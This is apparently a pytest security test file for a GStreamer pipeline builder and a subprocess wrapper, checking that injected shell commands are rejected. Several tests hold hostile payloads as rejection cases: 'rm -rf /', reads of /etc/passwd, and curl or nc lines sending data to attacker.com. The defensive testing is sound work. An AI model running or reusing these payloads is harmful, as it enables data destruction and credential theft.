"""
Security tests for subprocess command injection prevention.

Tests the secure subprocess execution system to ensure it prevents
command injection attacks in GStreamer pipelines.
"""

import pytest
from unittest.mock import Mock, patch

from agentworld_core.subprocess_security import (
    GStreamerSecurityValidator,
    GStreamerPipelineBuilder,
    CommandInjectionError,
    safe_subprocess_run,
    validate_gstreamer_element_availability,
    create_secure_srt_pipeline,
    create_secure_rtmp_pipeline
)


class TestGStreamerSecurityValidator:
    """Test suite for GStreamer security validation."""

    def test_valid_elements(self):
        """Test that valid GStreamer elements are accepted."""
        valid_elements = [
            'gst-launch-1.0',
            'nvh264enc',
            'vaapih264enc',
            'x264enc',
            'srtsink',
            'rtmpsink'
        ]

        for element in valid_elements:
            result = GStreamerSecurityValidator.validate_element(element)
            assert result == element

    def test_invalid_elements(self):
        """Test that invalid GStreamer elements are rejected."""
        invalid_elements = [
            'malicious-element',
            'rm',
            'cat',
            '../../../bin/sh',
            'element; rm -rf /',
            'element && cat /etc/passwd'
        ]

        for element in invalid_elements:
            with pytest.raises(CommandInjectionError, match="not allowed"):
                GStreamerSecurityValidator.validate_element(element)

    def test_valid_properties(self):
        """Test that valid GStreamer properties are accepted."""
        valid_properties = [
            ('width', '1920'),
            ('height', '1080'),
            ('bitrate', '2000'),
            ('format', 'rgb'),
            ('framerate', '24/1'),
            ('preset', 'low-latency-hq'),
            ('sync', 'false'),
            ('async', 'true')
        ]

        for prop_name, prop_value in valid_properties:
            result = GStreamerSecurityValidator.validate_property(prop_name, prop_value)
            assert result == prop_value

    def test_invalid_properties(self):
        """Test that invalid GStreamer properties are rejected."""
        invalid_properties = [
            ('unknown_prop', 'value'),
            ('width', 'invalid'),
            ('height', '99999999'),  # Too large
            ('bitrate', 'high; rm -rf /'),
            ('format', 'rgb && cat /etc/passwd'),
            ('uri', 'srt://host; rm -rf /'),
            ('location', 'rtmp://host | cat /etc/passwd')
        ]

        for prop_name, prop_value in invalid_properties:
            with pytest.raises(CommandInjectionError):
                GStreamerSecurityValidator.validate_property(prop_name, prop_value)

    def test_url_validation(self):
        """Test URL validation for streaming."""
        # Valid URLs
        valid_urls = [
            'srt://127.0.0.1:9999',
            'rtmp://localhost:1935/live/stream',
            'srt://192.168.1.100:8000?mode=caller'
        ]

        for url in valid_urls:
            if url.startswith('srt://'):
                result = GStreamerSecurityValidator.validate_url(url, ['srt'])
            else:
                result = GStreamerSecurityValidator.validate_url(url, ['rtmp'])
            assert result == url

        # Invalid URLs
        invalid_urls = [
            'http://malicious.com/script',  # Wrong scheme
            'srt://host; rm -rf /',  # Command injection
            'rtmp://host && cat /etc/passwd',  # Command injection
            'srt://host | nc attacker.com 4444',  # Command injection
        ]

        for url in invalid_urls:
            with pytest.raises(CommandInjectionError):
                if url.startswith('srt://'):
                    GStreamerSecurityValidator.validate_url(url, ['srt'])
                else:
                    GStreamerSecurityValidator.validate_url(url, ['rtmp'])


class TestGStreamerPipelineBuilder:
    """Test suite for secure GStreamer pipeline building."""

    def setup_method(self):
        """Set up test environment."""
        self.builder = GStreamerPipelineBuilder()

    def test_valid_srt_pipeline(self):
        """Test creation of valid SRT pipeline."""
        pipeline = self.builder.create_srt_pipeline(
            width=1920,
            height=1080,
            fps=24,
            bitrate_kbps=2000,
            srt_url='srt://127.0.0.1:9999',
            encoder_type='x264'
        )

        assert isinstance(pipeline, list)
        assert len(pipeline) > 0
        assert 'gst-launch-1.0' in pipeline
        assert 'srtsink' in pipeline
        assert 'uri=srt://127.0.0.1:9999' in pipeline

    def test_valid_rtmp_pipeline(self):
        """Test creation of valid RTMP pipeline."""
        pipeline = self.builder.create_rtmp_pipeline(
            width=1920,
            height=1080,
            fps=24,
            bitrate_kbps=2000,
            rtmp_url='rtmp://localhost:1935/live/stream',
            encoder_type='x264'
        )

        assert isinstance(pipeline, list)
        assert len(pipeline) > 0
        assert 'gst-launch-1.0' in pipeline
        assert 'rtmpsink' in pipeline
        assert 'location=rtmp://localhost:1935/live/stream' in pipeline

    def test_invalid_parameters(self):
        """Test that invalid parameters are rejected."""
        # Invalid dimensions
        with pytest.raises(CommandInjectionError, match="width must be at least"):
            self.builder.create_srt_pipeline(
                width=0,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://127.0.0.1:9999'
            )

        # Invalid FPS
        with pytest.raises(CommandInjectionError, match="fps must be at least"):
            self.builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=0,
                bitrate_kbps=2000,
                srt_url='srt://127.0.0.1:9999'
            )

        # Invalid bitrate
        with pytest.raises(CommandInjectionError, match="bitrate_kbps must be at least"):
            self.builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=50,  # Too low
                srt_url='srt://127.0.0.1:9999'
            )

        # Invalid encoder type
        with pytest.raises(CommandInjectionError, match="encoder_type must be one of"):
            self.builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://127.0.0.1:9999',
                encoder_type='malicious-encoder'
            )

        # Invalid URL
        with pytest.raises(CommandInjectionError, match="dangerous character"):
            self.builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://host; rm -rf /'
            )

    def test_encoder_types(self):
        """Test different encoder types."""
        encoder_types = ['nvenc', 'vaapi', 'x264']

        for encoder_type in encoder_types:
            pipeline = self.builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://127.0.0.1:9999',
                encoder_type=encoder_type
            )

            assert isinstance(pipeline, list)
            if encoder_type == 'nvenc':
                assert 'nvh264enc' in pipeline
            elif encoder_type == 'vaapi':
                assert 'vaapih264enc' in pipeline
            else:  # x264
                assert 'x264enc' in pipeline


class TestSafeSubprocessRun:
    """Test suite for safe subprocess execution."""

    def test_safe_command_execution(self):
        """Test that safe commands are executed."""
        # This would need mocking in real tests to avoid actual execution
        cmd = ['echo', 'hello']

        with patch('agentworld_core.subprocess_security.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0)
            result = safe_subprocess_run(cmd, timeout=5)
            mock_run.assert_called_once()

    def test_dangerous_command_rejection(self):
        """Test that dangerous commands are rejected."""
        dangerous_commands = [
            ['echo', 'hello; rm -rf /'],
            ['gst-launch-1.0', 'element && cat /etc/passwd'],
            ['cmd', 'arg | nc attacker.com 4444'],
            ['command', 'arg & background_task']
        ]

        for cmd in dangerous_commands:
            with pytest.raises(CommandInjectionError, match="Dangerous characters"):
                safe_subprocess_run(cmd)


class TestFactoryFunctions:
    """Test suite for factory functions."""

    def test_create_secure_srt_pipeline(self):
        """Test SRT pipeline factory function."""
        pipeline = create_secure_srt_pipeline(
            width=1920,
            height=1080,
            fps=24,
            bitrate_kbps=2000,
            srt_url='srt://127.0.0.1:9999'
        )

        assert isinstance(pipeline, list)
        assert 'gst-launch-1.0' in pipeline
        assert 'srtsink' in pipeline

    def test_create_secure_rtmp_pipeline(self):
        """Test RTMP pipeline factory function."""
        pipeline = create_secure_rtmp_pipeline(
            width=1920,
            height=1080,
            fps=24,
            bitrate_kbps=2000,
            rtmp_url='rtmp://localhost:1935/live/stream'
        )

        assert isinstance(pipeline, list)
        assert 'gst-launch-1.0' in pipeline
        assert 'rtmpsink' in pipeline

    @patch('agentworld_core.subprocess_security.safe_subprocess_run')
    def test_validate_gstreamer_element_availability(self, mock_subprocess):
        """Test GStreamer element availability validation."""
        # Mock successful validation
        mock_subprocess.return_value = Mock(returncode=0)
        result = validate_gstreamer_element_availability('nvh264enc')
        assert result is True

        # Mock failed validation
        mock_subprocess.return_value = Mock(returncode=1)
        result = validate_gstreamer_element_availability('nonexistent-element')
        assert result is False

        # Test with invalid element name
        result = validate_gstreamer_element_availability('malicious; rm -rf /')
        assert result is False


class TestCommandInjectionPrevention:
    """Integration tests for command injection prevention."""

    def test_real_world_injection_attempts(self):
        """Test real-world command injection attempts."""
        builder = GStreamerPipelineBuilder()

        # Command injection through URL
        with pytest.raises(CommandInjectionError):
            builder.create_srt_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://localhost:9999; curl http://attacker.com/steal?data=$(cat /etc/passwd)'
            )

        # Command injection through numeric parameters
        with pytest.raises(CommandInjectionError):
            builder.create_srt_pipeline(
                width='1920; rm -rf /',
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                srt_url='srt://localhost:9999'
            )

        # Shell metacharacter injection
        with pytest.raises(CommandInjectionError):
            builder.create_rtmp_pipeline(
                width=1920,
                height=1080,
                fps=24,
                bitrate_kbps=2000,
                rtmp_url='rtmp://localhost:1935/live/stream && nc attacker.com 4444 < /etc/passwd'
            )


if __name__ == '__main__':
    pytest.main([__file__, '-v'])